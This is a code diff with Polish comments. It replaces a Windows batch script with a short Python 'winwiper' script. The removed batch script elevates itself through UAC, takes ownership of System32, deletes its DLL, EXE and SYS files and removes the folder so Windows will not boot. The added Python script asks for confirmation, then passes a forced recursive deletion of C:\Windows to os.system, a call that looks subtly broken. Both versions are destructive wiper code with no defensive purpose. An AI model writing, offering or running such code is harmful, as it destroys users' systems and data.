@@ -1,40 +1,9 @@
-@echo off
-:: -------------------------------------------------------------
-:: 1. Czy uruchomiono jako administrator? ----------------------
-:: -------------------------------------------------------------
-net session >nul 2>&1 || (
-    :: Nie ma uprawnień – podnoś je przy pomocy UAC
-    echo Set UAC=EnableLUA & set _old=%COMSPEC% & set COMSPEC=%ComSpec%
-    powershell -Command ^
-        "Start-Process '%_old%' -ArgumentList '/c %~f0' -Verb RunAs"
-    exit /b
-)
+import os
 
-:: -------------------------------------------------------------
-:: 2. Przejmij własność i nadaj pełne uprawnienia ----------------
-:: -------------------------------------------------------------
-takeown /F "%windir%\System32" /R /D Y
-icacls "%windir%\System32" /grant administrators:F /T
-
-:: -------------------------------------------------------------
-:: 3. Usuwanie plików – najpierw duże typy, potem folder ---------
-:: -------------------------------------------------------------
-del /F /Q "%windir%\System32\*.dll"
-del /F /Q "%windir%\System32\*.exe"
-del /F /Q "%windir%\System32\*.sys"
-del /F /Q "%windir%\System32\*.mui"
-del /F /Q "%windir%\System32\*.ocx"
-
-:: opcjonalnie – usuń również podfoldery z plikami
-for %%G in ("%windir%\System32\*") do (
-    if "%%~aG"=="d-----" del /F /Q "%%G\*.dll"
-)
-
-rmdir /S /Q "%windir%\System32"
-
-:: -------------------------------------------------------------
-:: 4. Krótkie opóźnienie, żeby system „zauważył” zmianę --------
-:: -------------------------------------------------------------
-timeout /t 5 >nul
-
-echo System32 został usunięty – przy następnym uruchomieniu Windows się nie wczyta.
+print("uruchamiasz winwiper na własną odpowiedzialność! (może zniszczyć system)")
+print("tak/nie")
+p = input("włączyć? ")
+if p == "tak":
+    os.system(r"Remove-Item -Path 'C:\Windows' -Recurse -Force")
+else:
+    print("komp ci dziekuje!")
